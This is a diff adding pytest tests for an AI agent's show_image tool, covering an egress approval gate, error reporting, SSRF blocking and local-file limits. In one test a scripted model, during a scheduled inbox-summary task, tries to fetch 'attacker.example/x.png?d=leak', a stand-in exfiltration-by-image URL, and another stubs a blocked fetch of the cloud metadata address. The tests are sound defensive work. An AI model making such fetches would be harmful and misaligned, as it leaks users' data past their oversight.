@@ -6,6 +6,7 @@ approval gate with no model, no network, and full determinism.
 """
 
 import datetime
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
@@ -3739,6 +3740,60 @@ class TestEgressGate:
         assert asked and asked[0][0] == "read_url"
         assert "attacker.example" in asked[0][2]  # the card names the novel host
 
+    def test_show_image_url_is_gated_like_any_other_egress(self, tmp_path, monkeypatch):
+        """A picture fetch is an outbound GET at a host the model chose — the
+        exact thing this gate exists for, so show_image joins EGRESS_TOOLS."""
+        import aish.agent as agent_module
+        from aish.agent import EGRESS_DENIED
+
+        fetched: list[str] = []
+        monkeypatch.setattr(
+            agent_module.web, "fetch_binary",
+            lambda url, max_bytes: (fetched.append(url), (b"\x89PNG\r\n\x1a\n", "image/png"))[1],
+        )
+        asked: list[tuple] = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[
+                    tool_call("show_image", source="https://attacker.example/x.png?d=leak",
+                              caption="x")
+                ]),
+                model_says("stopping"),
+            ],
+            origin="schedule",
+            state_dir=tmp_path,
+            approve_tool=lambda *a: (asked.append(a), False)[1],
+        )
+        agent.run_task("summarize my inbox")
+        assert fetched == []  # nothing left the machine
+        assert tool_messages(agent.messages)[0]["content"] == EGRESS_DENIED
+        assert asked and asked[0][0] == "show_image"
+        assert "attacker.example" in asked[0][2]
+
+    def test_show_image_local_path_reaches_no_host_and_is_never_gated(
+        self, tmp_path, monkeypatch
+    ):
+        """Its other form touches only this machine. Gating that would nag about
+        an egress that does not exist."""
+        picture = tmp_path / "shot.png"
+        picture.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[
+                    tool_call("show_image", source=str(picture), caption="shot")
+                ]),
+                model_says("done"),
+            ],
+            origin="schedule",
+            state_dir=tmp_path,
+            cwd=str(tmp_path),
+            approve_tool=lambda *a: (asked.append(a), True)[1],
+        )
+        agent.run_task("show it")
+        assert asked == []
+        assert "![shot](" in tool_messages(agent.messages)[-1]["content"]
+
     def test_owner_mentioned_host_runs_without_prompt(self, monkeypatch):
         fetched = self._stub_web(monkeypatch)
         asked = []
@@ -3957,3 +4012,252 @@ class TestThinkingStatus:
         one_line = "x" * 300
         capped = snippet(one_line)
         assert len(capped) == agent_module.STATUS_SNIPPET_CHARS and capped.endswith("…")
+
+
+PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
+
+
+class TestShowImage:
+    """#188: displaying a picture is a capability, not five primitives the model
+    reassembles blind. Every failure comes back DURING the turn as a sentence the
+    model can act on — that is the whole point, since before this every way an
+    image could fail failed in the browser after the turn was over."""
+
+    def _agent(self, responses, tmp_path, **kwargs):
+        return make_agent(responses, state_dir=tmp_path, **kwargs)
+
+    def _fake_fetch(self, monkeypatch, result):
+        """Stub the ONE outbound edge. `result` is (bytes, content_type) or an
+        exception to raise."""
+        import aish.agent as agent_module
+
+        asked: list[str] = []
+
+        def fetch_binary(url, max_bytes):
+            asked.append(url)
+            if isinstance(result, Exception):
+                raise result
+            return result
+
+        monkeypatch.setattr(agent_module.web, "fetch_binary", fetch_binary)
+        return asked
+
+    def _run(self, tmp_path, monkeypatch, result, source="https://ex.com/a.jpg", caption="a phone"):
+        asked = self._fake_fetch(monkeypatch, result)
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[tool_call("show_image", source=source, caption=caption)]
+                ),
+                model_says("here it is"),
+            ],
+            tmp_path,
+        )
+        agent.run_task("pic")
+        return agent, tool_messages(agent.messages)[-1]["content"], asked
+
+    def test_fetched_image_is_stored_and_the_markdown_line_handed_back(
+        self, tmp_path, monkeypatch
+    ):
+        agent, result, asked = self._run(tmp_path, monkeypatch, (PNG_BYTES, "image/png"))
+        assert asked == ["https://ex.com/a.jpg"]
+        stored = list((tmp_path / "media").iterdir())
+        assert len(stored) == 1 and stored[0].read_bytes() == PNG_BYTES
+        assert f"![a phone]({stored[0]})" in result
+
+    def test_the_stored_path_is_displayable(self, tmp_path, monkeypatch):
+        """A store that put the file somewhere no renderer serves from would just
+        move the silent failure to render time."""
+        agent, result, _ = self._run(tmp_path, monkeypatch, (PNG_BYTES, "image/png"))
+        stored = next((tmp_path / "media").iterdir())
+        roots = [Path(r).resolve() for r in agent.image_roots()]
+        assert any(stored.resolve().is_relative_to(r) for r in roots)
+
+    def test_the_returned_line_parses_as_a_markdown_image(self, tmp_path, monkeypatch):
+        """A caption with brackets or a newline silently breaks the image parser.
+        aish builds the line, so the model cannot get this wrong (it used to be
+        papered over with a memory)."""
+        import re
+
+        _, result, _ = self._run(
+            tmp_path, monkeypatch, (PNG_BYTES, "image/png"),
+            caption="the [inner] screen\nand its hinge",
+        )
+        match = re.search(r"!\[([^\]\n]*)\]\(([^)\s]+)\)", result)
+        assert match is not None
+        assert match.group(1) == "the inner screen and its hinge"
+        assert Path(match.group(2)).is_file()
+
+    def test_html_served_as_an_image_names_the_real_problem(self, tmp_path, monkeypatch):
+        """The exact failure from the session that motivated #188: the model had
+        a plausible .jpg URL that answered with a page."""
+        _, result, _ = self._run(
+            tmp_path, monkeypatch, (b"<!DOCTYPE html><html>blocked", "text/html")
+        )
+        assert result.startswith("ERROR")
+        assert "text/html" in result and "direct image file URL" in result
+        assert not (tmp_path / "media").exists()
+
+    def test_http_error_is_reported_not_swallowed(self, tmp_path, monkeypatch):
+        import urllib.error
+
+        error = urllib.error.HTTPError("https://ex.com/a.jpg", 404, "Not Found", {}, None)
+        _, result, _ = self._run(tmp_path, monkeypatch, error)
+        assert result.startswith("ERROR") and "404" in result
+
+    def test_transport_failure_is_reported(self, tmp_path, monkeypatch):
+        _, result, _ = self._run(tmp_path, monkeypatch, TimeoutError("timed out"))
+        assert result.startswith("ERROR") and "could not fetch" in result
+
+    def test_ssrf_guard_refusal_surfaces_as_a_message(self, tmp_path, monkeypatch):
+        from aish.web import BlockedURLError
+
+        _, result, _ = self._run(
+            tmp_path, monkeypatch,
+            BlockedURLError("'169.254.169.254' resolves to non-public address"),
+        )
+        assert result.startswith("ERROR") and "blocked" in result
+        assert not (tmp_path / "media").exists()
+
+    def test_oversize_image_refused(self, tmp_path, monkeypatch):
+        from aish import media as media_module
+
+        big = PNG_BYTES + b"\x00" * (media_module.IMAGE_MAX_BYTES + 1)
+        _, result, _ = self._run(tmp_path, monkeypatch, (big, "image/png"))
+        assert result.startswith("ERROR") and "larger than" in result
+
+    def test_a_local_file_inside_the_session_is_adopted(self, tmp_path, monkeypatch):
+        picture = tmp_path / "shot.png"
+        picture.write_bytes(PNG_BYTES)
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[tool_call("show_image", source=str(picture), caption="shot")]
+                ),
+                model_says("done"),
+            ],
+            tmp_path,
+            cwd=str(tmp_path),
+        )
+        agent.run_task("show it")
+        result = tool_messages(agent.messages)[-1]["content"]
+        assert "![shot](" in result
+        assert (tmp_path / "media").is_dir()
+
+    def test_a_local_file_outside_the_session_is_refused(self, tmp_path, monkeypatch):
+        outside = tmp_path.parent / "elsewhere.png"
+        outside.write_bytes(PNG_BYTES)
+        work = tmp_path / "project"
+        work.mkdir()
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[tool_call("show_image", source=str(outside), caption="x")]
+                ),
+                model_says("done"),
+            ],
+            tmp_path,
+            cwd=str(work),
+        )
+        agent.run_task("show it")
+        result = tool_messages(agent.messages)[-1]["content"]
+        assert result.startswith("ERROR") and "outside this session" in result
+
+    def test_a_local_non_image_is_refused(self, tmp_path):
+        notes = tmp_path / "notes.png"  # right extension, wrong bytes
+        notes.write_text("just text")
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[tool_call("show_image", source=str(notes), caption="x")]
+                ),
+                model_says("done"),
+            ],
+            tmp_path,
+            cwd=str(tmp_path),
+        )
+        agent.run_task("show it")
+        result = tool_messages(agent.messages)[-1]["content"]
+        assert result.startswith("ERROR") and "not a png" in result
+
+    def test_a_missing_local_file_is_refused(self, tmp_path):
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[
+                        tool_call("show_image", source=str(tmp_path / "gone.png"), caption="x")
+                    ]
+                ),
+                model_says("done"),
+            ],
+            tmp_path,
+            cwd=str(tmp_path),
+        )
+        agent.run_task("show it")
+        assert "no such file" in tool_messages(agent.messages)[-1]["content"]
+
+    def test_never_prompts_for_approval(self, tmp_path, monkeypatch):
+        """Its only write is an image into aish's own store — never user state —
+        so it belongs in the auto-approved read path like the scratch workspace."""
+        from aish.agent import READ_ONLY_TOOLS
+
+        assert "show_image" in READ_ONLY_TOOLS
+        asked: list = []
+        agent, _ = self._agent(
+            [
+                model_says(
+                    tool_calls=[
+                        tool_call("show_image", source="https://ex.com/b.jpg", caption="c")
+                    ]
+                ),
+                model_says("done"),
+            ],
+            tmp_path,
+            approve=lambda cmd: asked.append(cmd) or False,
+        )
+        self._fake_fetch(monkeypatch, (PNG_BYTES + b"b", "image/png"))
+        agent.run_task("pic")
+        assert asked == []
+        assert "![c](" in tool_messages(agent.messages)[-1]["content"]
+
+    def test_empty_source_is_a_message_not_a_crash(self, tmp_path):
+        agent, _ = self._agent(
+            [
+                model_says(tool_calls=[tool_call("show_image", source="", caption="x")]),
+                model_says("done"),
+            ],
+            tmp_path,
+        )
+        agent.run_task("pic")
+        assert "needs a source" in tool_messages(agent.messages)[-1]["content"]
+
+
+class TestImageRoots:
+    """One definition of "where a picture may be displayed from", consumed by
+    /file, the PDF exporter, and the terminal renderer. They disagreed before
+    #188 and the same file printed in a PDF while 403'ing in the chat."""
+
+    def test_covers_the_directories_aish_itself_owns(self, tmp_path):
+        agent, _ = make_agent([], state_dir=tmp_path, cwd=str(tmp_path))
+        roots = agent.image_roots()
+        assert agent.media_dir in roots
+        assert agent.scratch_dir in roots
+        assert Path(agent.cwd).resolve() in roots
+
+    def test_is_not_the_auto_approval_scope(self, tmp_path):
+        """Deliberately distinct from `roots`: the media store must be
+        displayable without becoming a directory the model may run commands in
+        unprompted — and without being dropped by restore_workspace, which
+        rebuilds `roots` authoritatively per session (#176)."""
+        agent, _ = make_agent([], state_dir=tmp_path, cwd=str(tmp_path))
+        assert agent.media_dir not in agent.roots
+        agent.restore_workspace(str(tmp_path), [])
+        assert agent.media_dir in agent.image_roots()
+        assert agent.scratch_dir in agent.image_roots()
+
+    def test_media_store_is_durable_not_the_scratch_workspace(self, tmp_path):
+        """Scratch is deleted when the session ends and a transcript is
+        permanent, so a picture living there is a broken image on every reopen."""
+        agent, _ = make_agent([], state_dir=tmp_path)
+        assert not agent.media_dir.is_relative_to(agent.scratch_dir)
+        assert agent.media_dir == tmp_path / "media"
